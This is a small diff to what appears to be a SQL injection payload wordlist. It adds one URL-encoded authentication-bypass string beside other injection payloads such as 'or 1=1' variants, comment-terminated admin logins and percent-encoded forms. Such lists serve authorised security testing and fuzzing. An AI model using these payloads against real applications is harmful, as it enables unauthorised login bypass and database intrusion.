@@ -2,6 +2,7 @@ test' or 1=1
 test' or '1'='1
 test' or 1='1' -- -
 admin'-- -
+admin'+or+'1'%3D'1
 %31%0a%6f%72%20%31%3d%31
 2%20or%201=1#
 %60 or 1=1#
